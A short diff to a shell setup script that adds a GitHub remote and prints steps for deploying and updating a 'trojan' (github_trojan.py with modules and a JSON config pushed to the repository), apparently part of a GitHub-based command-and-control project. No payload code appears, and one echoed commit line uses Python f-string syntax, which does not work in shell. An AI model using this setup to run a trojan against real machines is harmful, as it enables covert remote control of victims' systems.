@@ -25,3 +25,9 @@ read user_input
 echo -n "Enter Repository name here: "
 read dir_input
 git remote add origin https://github.com/$user_input/$dir_input
+echo "Please put your modules, and json file into the modules directory."
+echo "Please input the github_trojan.py into the config direcotry and run it."
+echo "Please run the push_trojan_updates.sh or enter the following commands to update the trojan with the appriopriate modules, and settings."
+echo "git add ."
+echo "git commit -m f\"{user_input}\""
+echo "git push origin master"
